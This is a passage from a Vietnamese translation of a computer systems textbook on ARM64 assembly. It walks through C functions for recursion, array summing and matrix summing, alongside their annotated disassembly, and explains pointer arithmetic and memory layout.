0x7ac &lt;+60&gt;: ret                         // trả về w0 (kết quả)
</code></pre>
<p>Mỗi dòng trong đoạn assembly trên đều đã được chú thích bằng tiếng Anh trong sách gốc.<br />
<strong>Bảng 2</strong> dưới đây cho thấy dạng <code>goto</code> tương ứng (trái) và chương trình C không dùng <code>goto</code> (phải):</p>
<h4 id="dạng-c-với-goto-1"><a class="header" href="#dạng-c-với-goto-1">Dạng C với goto</a></h4>
<pre><code class="language-c">int sumr(int n) {
    int result;
    if (n &gt; 0) {
        goto body;
    }
    result = 0;
    goto done;
body:
    result = n;
    result--;
    result = sumr(result);
    result += n;
done:
    return result;
}
</code></pre>
<h4 id="dạng-c-không-dùng-goto"><a class="header" href="#dạng-c-không-dùng-goto">Dạng C không dùng goto</a></h4>
<pre><code class="language-c">int sumr(int n) {
    int result;
    if (n &lt;= 0) {
        return 0;
    }
    result = sumr(n-1);
    result += n;
    return result;
}
</code></pre>
<p><strong>Bảng 2.</strong> Dạng C với goto và bản dịch từ assembly của <code>sumr()</code>.</p>
<p>Mặc dù bản dịch này ban đầu có vẻ không giống hệt hàm <code>sumr</code> gốc, nhưng khi xem xét kỹ, ta thấy hai hàm này thực sự tương đương.</p>
<h3 id="961-quan-sát-sự-thay-đổi-của-call-stack"><a class="header" href="#961-quan-sát-sự-thay-đổi-của-call-stack">9.6.1. Quan sát sự thay đổi của Call Stack</a></h3>
<p>Như một bài tập, bạn hãy thử vẽ lại stack và quan sát sự thay đổi giá trị.<br />
Hình động dưới đây minh họa cách stack được cập nhật khi chạy hàm này với giá trị <code>3</code>:</p>
<p><img src="C9-ARM64/_images/recursion.png" alt="recursion" /></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="97-mảng-arrays"><a class="header" href="#97-mảng-arrays">9.7. Mảng (Arrays)</a></h2>
<p>Hãy nhớ rằng <a href="C9-ARM64/../C1-C_intro/arrays_strings.html#_introduction_to_arrays">array</a> là tập hợp có thứ tự của các phần tử dữ liệu cùng kiểu, được lưu trữ liên tiếp nhau trong bộ nhớ. <strong>Single-dimension array</strong> (mảng một chiều) được cấp phát tĩnh có dạng <code>Type arr[N]</code>, trong đó <code>Type</code> là kiểu dữ liệu, <code>arr</code> là tên định danh của mảng, và <code>N</code> là số phần tử dữ liệu. Khai báo mảng tĩnh như <code>Type arr[N]</code> hoặc cấp phát động như <code>arr = malloc(N*sizeof(Type))</code> sẽ chiếm tổng cộng <em>N</em> × <code>sizeof</code>(<em>Type</em>) byte bộ nhớ.</p>
<p>Để truy cập phần tử tại chỉ số <code>i</code> trong mảng <code>arr</code>, sử dụng cú pháp <code>arr[i]</code>. <strong>Compiler</strong> (trình biên dịch) thường chuyển đổi các truy cập mảng thành <a href="C9-ARM64/../C2-C_depth/pointers.html#_pointer_variables">pointer arithmetic</a> trước khi dịch sang code assembly. Do đó, <code>arr+i</code> tương đương với <code>&amp;arr[i]</code>, và <code>*(arr+i)</code> tương đương với <code>arr[i]</code>. Vì mỗi phần tử dữ liệu trong <code>arr</code> có kiểu <code>Type</code>, nên <code>arr+i</code> ngụ ý rằng phần tử <code>i</code> được lưu tại địa chỉ <code>arr + sizeof(Type) * i</code>.</p>
<p>Bảng 1 dưới đây tóm tắt một số thao tác mảng thường gặp và lệnh assembly tương ứng. Trong các ví dụ, giả sử ta khai báo một mảng <code>int</code> có độ dài 10 (ví dụ: <code>int arr[10]</code>). Giả sử thanh ghi <code>x1</code> lưu địa chỉ của <code>arr</code>, thanh ghi <code>x2</code> lưu giá trị <code>i</code> kiểu <code>int</code>, và thanh ghi <code>x0</code> biểu diễn một biến <code>x</code> (cũng kiểu <code>int</code>). Hãy nhớ rằng biến <code>int</code> chiếm 4 byte, trong khi biến <code>int *</code> chiếm 8 byte.</p>
<div class="table-wrapper"><table><thead><tr><th>Operation</th><th>Type</th><th>Assembly Representation</th></tr></thead><tbody>
<tr><td><code>x = arr</code></td><td><code>int *</code></td><td><code>mov x0, x1</code></td></tr>
<tr><td><code>x = arr[0]</code></td><td><code>int</code></td><td><code>ldr w0, [x1]</code></td></tr>
<tr><td><code>x = arr[i]</code></td><td><code>int</code></td><td><code>ldr w0, [x1, x2, LSL, #2]</code></td></tr>
<tr><td><code>x = &amp;arr[3]</code></td><td><code>int *</code></td><td><code>add x0, x1, #12</code></td></tr>
<tr><td><code>x = arr+3</code></td><td><code>int *</code></td><td><code>add x0, x1, #12</code></td></tr>
<tr><td><code>x = *(arr+5)</code></td><td><code>int</code></td><td><code>ldr w0, [x1, #20]</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các thao tác mảng thường gặp và lệnh assembly tương ứng</p>
<p>Lưu ý rằng để truy cập phần tử <code>arr[5]</code> (hoặc <code>*(arr+5)</code> khi dùng pointer arithmetic), compiler thực hiện truy xuất bộ nhớ tại địa chỉ <code>arr + 5*4</code> thay vì <code>arr+5</code>. Để hiểu tại sao, hãy nhớ rằng bất kỳ phần tử nào tại chỉ số <code>i</code> trong mảng đều được lưu tại địa chỉ <code>arr + sizeof(Type) * i</code>. Do đó, compiler phải nhân chỉ số với kích thước kiểu dữ liệu (trong trường hợp này là 4, vì <code>sizeof(int) = 4</code>) để tính toán đúng offset. Cũng cần nhớ rằng bộ nhớ được đánh địa chỉ theo byte; việc dịch đúng số byte tương đương với việc tính toán đúng địa chỉ.</p>
<p>Ví dụ, xét một mảng (<code>array</code>) gồm 10 phần tử kiểu <code>int</code> ([FigArray6]).</p>
<p><img src="C9-ARM64/_images/arrayFig.png" alt="Each integer in the array requires four bytes." /></p>
<p><strong>Hình 1.</strong> Sơ đồ bố trí bộ nhớ của mảng gồm 10 số nguyên. Mỗi ô được gắn nhãn a~i~ biểu thị một offset 4 byte, vì mỗi số nguyên cần 4 byte để lưu trữ.</p>
<p>Lưu ý rằng vì <code>array</code> là mảng số nguyên, mỗi phần tử chiếm đúng 4 byte. Do đó, một mảng <code>int</code> gồm 10 phần tử sẽ chiếm 40 byte bộ nhớ liên tiếp.</p>
<p>Để tính địa chỉ của phần tử thứ 3, compiler nhân chỉ số 3 với kích thước dữ liệu của kiểu <code>int</code> (4) để được offset 12 (hay 0xc). Quả thật, phần tử thứ 3 trong Hình 1 nằm tại byte offset a~12~.</p>
<p>Hãy xem một hàm C đơn giản có tên <code>sumArray</code> dùng để tính tổng tất cả các phần tử trong mảng:</p>
<pre><code class="language-c">int sumArray(int *array, int length) {
    int i, total = 0;
    for (i = 0; i &lt; length; i++) {
        total += array[i];
    }
    return total;
}
</code></pre>
<p>Hàm <code>sumArray</code> nhận địa chỉ của một mảng và độ dài tương ứng, sau đó cộng dồn tất cả các phần tử trong mảng. Bây giờ, hãy xem code assembly tương ứng của hàm <code>sumArray</code>:</p>
<pre><code>Dump of assembler code for function sumArray:
0x874 &lt;+0&gt;:   sub    sp, sp, #0x20       // tăng stack thêm 32 byte (tạo frame mới)
0x878 &lt;+4&gt;:   str    x0, [sp, #8]        // lưu x0 tại sp + 8 (địa chỉ mảng)
0x87c &lt;+8&gt;:   str    w1, [sp, #4]        // lưu w1 tại sp + 4 (length)
0x880 &lt;+12&gt;:  str    wzr, [sp, #28]      // lưu 0 tại sp + 28 (total)
0x884 &lt;+16&gt;:  str    wzr, [sp, #24]      // lưu 0 tại sp + 24 (i)
0x888 &lt;+20&gt;:  b      0x8b8 &lt;sumArray+68&gt; // nhảy tới &lt;sumArray+68&gt;
0x88c &lt;+24&gt;:  ldrsw  x0, [sp, #24]       // x0 = i
0x890 &lt;+28&gt;:  lsl    x0, x0, #2          // dịch trái i 2 bit (i &lt;&lt; 2, hay i*4)
0x894 &lt;+32&gt;:  ldr    x1, [sp, #8]        // x1 = array
0x898 &lt;+36&gt;:  add    x0, x1, x0          // x0 = array + i*4
0x89c &lt;+40&gt;:  ldr    w0, [x0]            // w0 = array[i]
0x8a0 &lt;+44&gt;:  ldr    w1, [sp, #28]       // w1 = total
0x8a4 &lt;+48&gt;:  add    w0, w1, w0          // w0 = total + array[i]
0x8a8 &lt;+52&gt;:  str    w0, [sp, #28]       // lưu (total + array[i]) vào total
0x8ac &lt;+56&gt;:  ldr    w0, [sp, #24]       // w0 = i
0x8b0 &lt;+60&gt;:  add    w0, w0, #0x1        // w0 = w0 + 1 (i+1)
0x8b4 &lt;+64&gt;:  str    w0, [sp, #24]       // lưu (i + 1) vào i (i.e. i+=1)
0x8b8 &lt;+68&gt;:  ldr    w1, [sp, #24]       // w1 = i
0x8bc &lt;+72&gt;:  ldr    w0, [sp, #4]        // w0 = length
0x8c0 &lt;+76&gt;:  cmp    w1, w0              // so sánh i và length
0x8c4 &lt;+80&gt;:  b.lt   0x88c &lt;sumArray+24&gt; // nếu (i &lt; length) thì nhảy tới &lt;sumArray+24&gt;
0x8c8 &lt;+84&gt;:  ldr    w0, [sp, #28]       // w0 = total
0x8cc &lt;+88&gt;:  add    sp, sp, #0x20       // khôi phục stack về trạng thái ban đầu
0x8d0 &lt;+92&gt;:  ret                        // trả về (total)
</code></pre>
<p>Khi lần theo đoạn code assembly này, hãy cân nhắc xem dữ liệu được truy cập là <strong>pointer</strong> (con trỏ) hay <strong>value</strong> (giá trị).<br />
Ví dụ, lệnh tại <code>&lt;sumArray+12&gt;</code> khiến vị trí <code>sp + 28</code> trên stack chứa một biến kiểu <code>int</code>, ban đầu được gán giá trị <code>0</code>. Ngược lại, đối số được lưu tại <code>sp + 8</code> là đối số đầu tiên của hàm (<code>array</code>), có kiểu <code>int *</code> và tương ứng với địa chỉ cơ sở của mảng. Một biến khác (gọi là <code>i</code>) được lưu tại <code>sp + 24</code> và ban đầu được gán giá trị 0.</p>
<p>Người đọc tinh ý sẽ nhận thấy một lệnh mới chưa gặp trước đây tại dòng <code>&lt;sumArray+24&gt;</code> là <code>ldrsw</code>. Lệnh <code>ldrsw</code> (viết tắt của <em>load register signed word</em>) sẽ lấy giá trị <code>int</code> 32-bit được lưu tại <code>sp + 24</code>, chuyển nó thành số nguyên 64-bit và lưu vào <code>x0</code>. Thao tác này là cần thiết vì các lệnh tiếp theo sẽ thực hiện <strong>pointer arithmetic</strong> (tính toán trên con trỏ). Hãy nhớ rằng trên hệ thống 64-bit, con trỏ chiếm 8 byte. Việc compiler sử dụng <code>ldrsw</code> giúp đơn giản hóa quá trình bằng cách đảm bảo mọi dữ liệu đều được lưu trong thanh ghi 64-bit đầy đủ thay vì chỉ ở dạng 32-bit.</p>
<p>Hãy xem kỹ hơn bảy lệnh từ <code>&lt;sumArray+28&gt;</code> đến <code>&lt;sumArray+52&gt;</code>:</p>
<pre><code>0x890 &lt;+28&gt;:  lsl    x0, x0, #2             // dịch trái i 2 bit (i &lt;&lt; 2, hay i*4)
0x894 &lt;+32&gt;:  ldr    x1, [sp, #8]           // x1 = array
0x898 &lt;+36&gt;:  add    x0, x1, x0             // x0 = array + i*4
0x89c &lt;+40&gt;:  ldr    w0, [x0]               // w0 = array[i]
0x8a0 &lt;+44&gt;:  ldr    w1, [sp, #28]          // w1 = total
0x8a4 &lt;+48&gt;:  add    w0, w1, w0             // w0 = total + array[i]
0x8a8 &lt;+52&gt;:  str    w0, [sp, #28]          // lưu (total + array[i]) vào total
</code></pre>
<ul>
<li>Compiler dùng <code>lsl</code> để dịch trái giá trị <code>i</code> trong <code>x0</code>. Sau khi lệnh này thực thi, <code>x0</code> chứa <code>i &lt;&lt; 2</code> hay <code>i * 4</code>. Lúc này, <code>x0</code> chính là số byte cần dịch để tính đúng offset của <code>array[i]</code> (vì <code>sizeof(int) = 4</code>).</li>
<li>Lệnh tiếp theo <code>ldr x1, [sp, #8]</code> nạp đối số đầu tiên của hàm (địa chỉ cơ sở của <code>array</code>) vào thanh ghi <code>x1</code>.</li>
<li>Lệnh <code>add x0, x1, x0</code> cộng địa chỉ cơ sở <code>x1</code> với offset <code>i*4</code> trong <code>x0</code>, kết quả <code>x0</code> chứa <code>array + i*4</code>. Như đã biết, phần tử tại chỉ số <code>i</code> trong <code>array</code> được lưu tại địa chỉ <code>array + sizeof(T) * i</code>, nên <code>x0</code> lúc này chính là địa chỉ <code>&amp;array[i]</code> ở mức assembly.</li>
<li>Lệnh tại <code>&lt;sumArray+40&gt;</code> <em>dereference</em> (giải tham chiếu) giá trị tại địa chỉ <code>x0</code>, đưa giá trị <code>array[i]</code> vào <code>w0</code>. Lưu ý việc dùng thanh ghi thành phần <code>w0</code> vì <code>array[i]</code> là giá trị <code>int</code> 32-bit.<br />
Ngược lại, biến <code>i</code> trước đó đã được chuyển sang 64-bit tại <code>&lt;sumArray+24&gt;</code> vì nó được dùng cho <em>address computation</em> (tính toán địa chỉ). Nhắc lại, địa chỉ (pointer) được lưu dưới dạng từ 64-bit.</li>
<li>Ba lệnh cuối từ <code>&lt;sumArray+44&gt;</code> đến <code>&lt;sumArray+52&gt;</code> nạp giá trị hiện tại của <code>total</code> vào <code>w1</code>, cộng <code>array[i]</code> vào, lưu kết quả vào <code>w0</code>, rồi cập nhật <code>total</code> tại <code>sp + 28</code> với tổng mới.</li>
</ul>
<p>Vì vậy, bảy lệnh từ <code>&lt;sumArray+28&gt;</code> đến <code>&lt;sumArray+52&gt;</code> tương đương với dòng lệnh C:</p>
<pre><code class="language-c">total += array[i];
</code></pre>
<p>trong hàm <code>sumArray</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="98-ma-trận-matrices"><a class="header" href="#98-ma-trận-matrices">9.8. Ma trận (Matrices)</a></h2>
<p><strong>Ma trận</strong> là một mảng hai chiều (2D array).<br />
Trong C, một ma trận có thể được:</p>
<ul>
<li><strong>Cấp phát tĩnh</strong> dưới dạng mảng 2D (<code>M[n][m]</code>) — nằm trên stack.</li>
<li><strong>Cấp phát động</strong> bằng một lần gọi <code>malloc</code>.</li>
<li><strong>Cấp phát động</strong> dưới dạng mảng của các mảng (<em>array of arrays</em>).</li>
</ul>
<p>Hãy xét cách triển khai <strong>mảng của các mảng</strong>:<br />
Mảng đầu tiên chứa <code>n</code> phần tử (<code>M[n]</code>), và mỗi phần tử <code>M[i]</code> lại chứa một mảng gồm <code>m</code> phần tử.</p>
<p>Ví dụ dưới đây khai báo các ma trận kích thước 4 × 3:</p>
<pre><code class="language-c">// ma trận cấp phát tĩnh (trên stack)
int M1[4][3];

// ma trận cấp phát động (dễ lập trình, trên heap)
int **M2, i;
M2 = malloc(4 * sizeof(int*));
for (i = 0; i &lt; 4; i++) {
    M2[i] = malloc(3 * sizeof(int));
}
</code></pre>
<p>Với ma trận cấp phát động, mảng chính chứa một mảng liên tiếp các con trỏ <code>int</code>.<br />
Mỗi con trỏ này trỏ tới một mảng khác trong bộ nhớ.</p>
<p><strong>Hình 1</strong> minh họa cách chúng ta thường hình dung hai loại ma trận này:</p>
<p><img src="C9-ARM64/_images/matrices.png" alt="matrices" /></p>
<p><strong>Hình 1.</strong> Minh họa ma trận cấp phát tĩnh (M1) và ma trận cấp phát động (M2) kích thước 3×4.</p>
<p>Với cả hai cách khai báo trên, phần tử <em>(i, j)</em> có thể được truy cập bằng cú pháp <code>M[i][j]</code>, với <code>M</code> là <code>M1</code> hoặc <code>M2</code>.<br />
Tuy nhiên, cách tổ chức dữ liệu trong bộ nhớ là khác nhau:</p>
<ul>
<li>Cả hai đều lưu các phần tử của mảng chính liên tiếp trong bộ nhớ.</li>
<li>Ma trận cấp phát tĩnh (<code>M1</code>) <strong>cũng lưu toàn bộ các hàng liên tiếp nhau</strong> trong bộ nhớ:</li>
</ul>
<p><img src="C9-ARM64/_images/matrixArray.png" alt="matrixArray" /></p>
<p><strong>Hình 2.</strong> Bố trí bộ nhớ của M1 theo thứ tự hàng (<em>row-major order</em>).</p>
<p>Điều này <strong>không được đảm bảo</strong> với <code>M2</code>.<br />
<a href="C9-ARM64/../C2-C_depth/arrays.html#_two_dimensional_array_memory_layout">Nhớ rằng</a>, để cấp phát liên tiếp một ma trận <em>n × m</em> trên heap, ta nên dùng <strong>một lần gọi <code>malloc</code></strong> để cấp phát <em>n × m</em> phần tử:</p>
<pre><code class="language-c">// ma trận động (trên heap, cách hiệu quả về bộ nhớ)
#define ROWS 4
#define COLS 3
int *M3;
M3 = malloc(ROWS * COLS * sizeof(int));
</code></pre>
<p>Với khai báo <code>M3</code>, phần tử <em>(i, j)</em> <strong>không thể</strong> truy cập bằng cú pháp <code>M[i][j]</code>.<br />
Thay vào đó, phải truy cập bằng:</p>
<pre><code class="language-c">M3[i * cols + j]
</code></pre>
<h3 id="981-mảng-hai-chiều-liên-tiếp-contiguous-two-dimensional-arrays"><a class="header" href="#981-mảng-hai-chiều-liên-tiếp-contiguous-two-dimensional-arrays">9.8.1. Mảng hai chiều liên tiếp (Contiguous Two-Dimensional Arrays)</a></h3>
<p>Xét hàm <code>sumMat</code> nhận:</p>
<ul>
<li>Con trỏ tới một ma trận được cấp phát liên tiếp (tĩnh hoặc động hiệu quả bộ nhớ) làm tham số đầu tiên.</li>
<li>Số hàng và số cột.</li>
</ul>
<p>Hàm trả về tổng tất cả các phần tử trong ma trận.</p>
<p>Ta dùng <strong>scaled indexing</strong> (chỉ số có nhân hệ số) vì nó áp dụng cho cả ma trận tĩnh và động liên tiếp.<br />
Nhớ rằng cú pháp <code>m[i][j]</code> <strong>không hoạt động</strong> với cách cấp phát động liên tiếp hiệu quả bộ nhớ đã nói ở trên.</p>
<pre><code class="language-c">int sumMat(int *m, int rows, int cols) {
    int i, j, total = 0;
    for (i = 0; i &lt; rows; i++) {
        for (j = 0; j &lt; cols; j++) {
            total += m[i * cols + j];
        }
    }
    return total;
}
</code></pre>
<p>Dưới đây là code assembly tương ứng, với chú thích từng dòng:</p>
<pre><code>Dump of assembler code for function sumMat:
0x884 &lt;+0&gt;:   sub   sp, sp, #0x20      // mở rộng stack thêm 32 byte (frame mới)
0x888 &lt;+4&gt;:   str   x0, [sp, #8]       // lưu m tại sp + 8
0x88c &lt;+8&gt;:   str   w1, [sp, #4]       // lưu rows tại sp + 4
0x890 &lt;+12&gt;:  str   w2, [sp]           // lưu cols tại đỉnh stack
0x894 &lt;+16&gt;:  str   wzr, [sp, #28]     // total = 0 tại sp + 28
0x898 &lt;+20&gt;:  str   wzr, [sp, #20]     // i = 0 tại sp + 20
0x89c &lt;+24&gt;:  b     0x904 &lt;sumMat+128&gt; // nhảy tới &lt;sumMat+128&gt;
0x8a0 &lt;+28&gt;:  str   wzr, [sp, #24]     // j = 0 tại sp + 24
0x8a4 &lt;+32&gt;:  b     0x8e8 &lt;sumMat+100&gt; // nhảy tới &lt;sumMat+100&gt;
0x8a8 &lt;+36&gt;:  ldr   w1, [sp, #20]      // w1 = i
0x8ac &lt;+40&gt;:  ldr   w0, [sp]           // w0 = cols
0x8b0 &lt;+44&gt;:  mul   w1, w1, w0         // w1 = cols * i
0x8b4 &lt;+48&gt;:  ldr   w0, [sp, #24]      // w0 = j
0x8b8 &lt;+52&gt;:  add   w0, w1, w0         // w0 = (cols * i) + j
0x8bc &lt;+56&gt;:  sxtw  x0, w0             // x0 = signExtend(cols * i + j)
0x8c0 &lt;+60&gt;:  lsl   x0, x0, #2         // x0 = (cols * i + j) * 4
0x8c4 &lt;+64&gt;:  ldr   x1, [sp, #8]       // x1 = m
0x8c8 &lt;+68&gt;:  add   x0, x1, x0         // x0 = &amp;m[i*cols + j]
0x8cc &lt;+72&gt;:  ldr   w0, [x0]           // w0 = m[i*cols + j]
0x8d0 &lt;+76&gt;:  ldr   w1, [sp, #28]      // w1 = total
0x8d4 &lt;+80&gt;:  add   w0, w1, w0         // w0 = total + m[i*cols + j]
0x8d8 &lt;+84&gt;:  str   w0, [sp, #28]      // total = total + m[i*cols + j]
0x8dc &lt;+88&gt;:  ldr   w0, [sp, #24]      // w0 = j
0x8e0 &lt;+92&gt;:  add   w0, w0, #0x1       // w0 = j + 1
0x8e4 &lt;+96&gt;:  str   w0, [sp, #24]      // j = j + 1
0x8e8 &lt;+100&gt;: ldr   w1, [sp, #24]      // w1 = j
0x8ec &lt;+104&gt;: ldr   w0, [sp]           // w0 = cols
0x8f0 &lt;+108&gt;: cmp   w1, w0             // so sánh j và cols
0x8f4 &lt;+112&gt;: b.lt  0x8a8 &lt;sumMat+36&gt;  // nếu (j &lt; cols) quay lại &lt;sumMat+36&gt;
0x8f8 &lt;+116&gt;: ldr   w0, [sp, #20]      // w0 = i
0x8fc &lt;+120&gt;: add   w0, w0, #0x1       // w0 = i + 1
0x900 &lt;+124&gt;: str   w0, [sp, #20]      // i = i + 1
0x904 &lt;+128&gt;: ldr   w1, [sp, #20]      // w1 = i
0x908 &lt;+132&gt;: ldr   w0, [sp, #4]       // w0 = rows
0x90c &lt;+136&gt;: cmp   w1, w0             // so sánh i và rows
0x910 &lt;+140&gt;: b.lt  0x8a0 &lt;sumMat+28&gt;  // nếu (i &lt; rows) goto &lt;sumMat+28&gt; 
0x914 &lt;+144&gt;: ldr w0, [sp, #28] // w0 = total
0x918 &lt;+148&gt;: add sp, sp, #0x20 // revert stack to prior state
0x91c &lt;+152&gt;: ret // return (total)
</code></pre>
<p>Các biến cục bộ <code>i</code>, <code>j</code> và <code>total</code> lần lượt được lưu tại các vị trí trên stack là <code>sp + 20</code>, <code>sp + 24</code> và <code>sp + 28</code>.<br />
Các tham số đầu vào <code>m</code>, <code>row</code> và <code>cols</code> lần lượt được lưu tại <code>sp + 8</code>, <code>sp + 4</code> và <code>sp</code> (đỉnh stack).</p>
<p>Với thông tin này, hãy tập trung vào đoạn code chỉ xử lý việc truy cập phần tử (<em>i</em>, <em>j</em>) trong ma trận (từ địa chỉ 0x8a8 đến 0x8d8):</p>
<pre><code>0x8a8 &lt;+36&gt;:   ldr   w1, [sp, #20]       // w1 = i
0x8ac &lt;+40&gt;:   ldr   w0, [sp]            // w0 = cols
0x8b0 &lt;+44&gt;:   mul   w1, w1, w0          // w1 = cols * i
</code></pre>
<p>Bộ lệnh đầu tiên này tính giá trị <code>cols * i</code> và lưu vào thanh ghi <code>w1</code>.<br />
Hãy nhớ rằng, với một ma trận tên <code>matrix</code>, biểu thức <code>matrix + i * cols</code> tương đương với <code>&amp;matrix[i]</code>.</p>
<pre><code>0x8b4 &lt;+48&gt;:   ldr   w0, [sp, #24]       // w0 = j
0x8b8 &lt;+52&gt;:   add   w0, w1, w0          // w0 = (cols * i) + j
0x8bc &lt;+56&gt;:   sxtw  x0, w0              // x0 = signExtend(cols * i + j)
0x8c0 &lt;+60&gt;:   lsl   x0, x0, #2          // x0 = (cols * i + j) * 4
</code></pre>
<p>Bộ lệnh tiếp theo tính <code>(cols * i + j) * 4</code>.<br />
Compiler nhân chỉ số <code>(cols * i + j)</code> với 4 vì mỗi phần tử trong ma trận là một số nguyên 4 byte.<br />
Phép nhân này giúp tính đúng <strong>offset</strong> trong bộ nhớ.<br />
Lệnh <code>sxtw</code> tại <code>&lt;sumMat+56&gt;</code> mở rộng dấu (sign-extend) giá trị trong <code>w0</code> thành số nguyên 64-bit, vì giá trị này sẽ được dùng để tính địa chỉ.</p>
<p>Bộ lệnh tiếp theo cộng offset vừa tính vào con trỏ ma trận và dereference để lấy giá trị phần tử (<em>i</em>, <em>j</em>):</p>
<pre><code>0x8c4 &lt;+64&gt;: ldr   x1, [sp, #8]  // x1 = m
0x8c8 &lt;+68&gt;: add   x0, x1, x0    // x0 = m + (cols*i + j)*4 (hay &amp;m[i*cols + j])
0x8cc &lt;+72&gt;: ldr   w0, [x0]      // w0 = m[i*cols + j]
0x8d0 &lt;+76&gt;: ldr   w1, [sp, #28] // w1 = total
0x8d4 &lt;+80&gt;: add   w0, w1, w0    // w0 = total + m[i*cols + j]
0x8d8 &lt;+84&gt;: str   w0, [sp, #28] // total = total + m[i*cols + j]
</code></pre>
<ul>
<li>Lệnh đầu tiên nạp địa chỉ của ma trận <code>m</code> vào thanh ghi <code>x1</code>.</li>
<li>Lệnh <code>add</code> cộng <code>(cols * i + j) * 4</code> vào địa chỉ <code>m</code> để tính đúng vị trí phần tử (<em>i</em>, <em>j</em>), kết quả lưu vào <code>x0</code>.</li>
<li>Lệnh <code>ldr</code> tiếp theo dereference địa chỉ trong <code>x0</code> và lưu giá trị <code>m[i * cols + j]</code> vào <code>w0</code>.<br />
Lưu ý: sử dụng <code>w0</code> (thanh ghi 32-bit) vì phần tử là <code>int</code> (4 byte).</li>
</ul>
<p>Ba lệnh cuối nạp giá trị hiện tại của <code>total</code> vào <code>w1</code>, cộng với <code>m[i * cols + j]</code>, rồi lưu kết quả mới vào <code>total</code>.</p>
<p><strong>Ví dụ truy cập phần tử (1,2) trong ma trận M1</strong> (Hình 3):</p>
<p><img src="C9-ARM64/_images/matrixArray.png" alt="matrixArray" /></p>
<p><strong>Hình 3.</strong> Bố trí bộ nhớ của M1 theo thứ tự hàng (<em>row-major order</em>).</p>
<p>Phần tử (1,2) nằm tại địa chỉ <code>M1 + 1 * cols + 2</code>.<br />
Vì <code>cols = 3</code>, nên (1,2) tương ứng với <code>M1 + 5</code>.<br />
Để truy cập phần tử này, compiler nhân 5 với kích thước kiểu <code>int</code> (4 byte), thu được offset <code>M1 + 20</code>, tương ứng với byte a~20~ trong hình.<br />
Dereference vị trí này sẽ lấy được giá trị 5 — đúng là phần tử (1,2) của ma trận.</p>
<h3 id="982-ma-trận-không-liên-tiếp-noncontiguous-matrix"><a class="header" href="#982-ma-trận-không-liên-tiếp-noncontiguous-matrix">9.8.2. Ma trận không liên tiếp (Noncontiguous Matrix)</a></h3>
<p>Cách triển khai ma trận <strong>không liên tiếp</strong> phức tạp hơn một chút.<br />
<strong>Hình 4</strong> minh họa cách <code>M2</code> có thể được bố trí trong bộ nhớ:</p>
<p><img src="C9-ARM64/_images/dynamicMatrixLayout.png" alt="matrixDynamic" /></p>
<p><strong>Hình 4.</strong> Bố trí bộ nhớ không liên tiếp của M2.</p>
<ul>
<li>Mảng con trỏ trong <code>M2</code> là <strong>liên tiếp</strong>.</li>
<li>Mỗi mảng mà <code>M2[i]</code> trỏ tới cũng <strong>liên tiếp</strong>.</li>
<li>Tuy nhiên, các mảng con này <strong>không liên tiếp với nhau</strong> trong bộ nhớ.</li>
</ul>
<p>Vì <code>M2</code> là mảng con trỏ, mỗi phần tử của <code>M2</code> chiếm 8 byte.<br />
Ngược lại, mỗi <code>M2[i]</code> là mảng <code>int</code>, nên các phần tử trong mỗi mảng con cách nhau 4 byte.</p>
<p>Hàm <code>sumMatrix</code> trong ví dụ sau nhận:</p>
<ul>
<li>Tham số đầu tiên: mảng con trỏ tới <code>int</code> (gọi là <code>matrix</code>).</li>
<li>Tham số thứ hai và thứ ba: số hàng và số cột.</li>
</ul>
<pre><code class="language-c">int sumMatrix(int **matrix, int rows, int cols) {
    int i, j, total=0;
    for (i = 0; i &lt; rows; i++) {
        for (j = 0; j &lt; cols; j++) {
            total += matrix[i][j];
        }
    }
    return total;
}
</code></pre>
<p>Mặc dù hàm này trông gần như giống hệt với hàm <code>sumMat</code> đã trình bày trước đó, nhưng ma trận mà hàm này nhận vào lại bao gồm <strong>một mảng liên tiếp các <em>con trỏ</em></strong>.<br />
Mỗi con trỏ chứa địa chỉ của một mảng liên tiếp riêng biệt, tương ứng với một hàng riêng trong ma trận.</p>
<p>Dưới đây là code assembly tương ứng của <code>sumMatrix</code>. Mỗi dòng đều được chú thích bằng tiếng Anh trong bản gốc:</p>
<pre><code>Dump of assembler code for function sumMatrix:
0x920 &lt;+0&gt;:   sub   sp, sp, #0x20         // mở rộng stack thêm 32 byte (frame mới)
0x924 &lt;+4&gt;:   str   x0, [sp, #8]          // lưu matrix tại sp + 8
0x928 &lt;+8&gt;:   str   w1, [sp, #4]          // lưu rows tại sp + 4
0x92c &lt;+12&gt;:  str   w2, [sp]              // lưu cols tại sp (đỉnh stack)
0x930 &lt;+16&gt;:  str   wzr, [sp, #28]        // total = 0 tại sp + 28
0x934 &lt;+20&gt;:  str   wzr, [sp, #20]        // i = 0 tại sp + 20
0x938 &lt;+24&gt;:  b     0x99c &lt;sumMatrix+124&gt; // nhảy tới &lt;sumMatrix+124&gt;
0x93c &lt;+28&gt;:  str   wzr, [sp, #24]        // j = 0 tại sp + 24
0x940 &lt;+32&gt;:  b     0x980 &lt;sumMatrix+96&gt;  // nhảy tới &lt;sumMatrix+96&gt;
0x944 &lt;+36&gt;:  ldrsw x0, [sp, #20]         // x0 = signExtend(i)
0x948 &lt;+40&gt;:  lsl   x0, x0, #3            // x0 = i &lt;&lt; 3 (hay i * 8)
0x94c &lt;+44&gt;:  ldr   x1, [sp, #8]          // x1 = matrix
0x950 &lt;+48&gt;:  add   x0, x1, x0            // x0 = matrix + i * 8
0x954 &lt;+52&gt;:  ldr   x1, [x0]              // x1 = matrix[i]
0x958 &lt;+56&gt;:  ldrsw x0, [sp, #24]         // x0 = signExtend(j)
0x95c &lt;+60&gt;:  lsl   x0, x0, #2            // x0 = j &lt;&lt; 2 (hay j * 4)
0x960 &lt;+64&gt;:  add   x0, x1, x0            // x0 = matrix[i] + j * 4
0x964 &lt;+68&gt;:  ldr   w0, [x0]              // w0 = matrix[i][j]
0x968 &lt;+72&gt;:  ldr   w1, [sp, #28]         // w1 = total
0x96c &lt;+76&gt;:  add   w0, w1, w0            // w0 = total + matrix[i][j]
0x970 &lt;+80&gt;:  str   w0, [sp, #28]         // total = total + matrix[i][j]
0x974 &lt;+84&gt;:  ldr   w0, [sp, #24]         // w0 = j
0x978 &lt;+88&gt;:  add   w0, w0, #0x1          // w0 = j + 1
0x97c &lt;+92&gt;:  str   w0, [sp, #24]         // j = j + 1
0x980 &lt;+96&gt;:  ldr   w1, [sp, #24]         // w1 = j
0x984 &lt;+100&gt;: ldr   w0, [sp]              // w0 = cols
0x988 &lt;+104&gt;: cmp   w1, w0                // so sánh j với cols
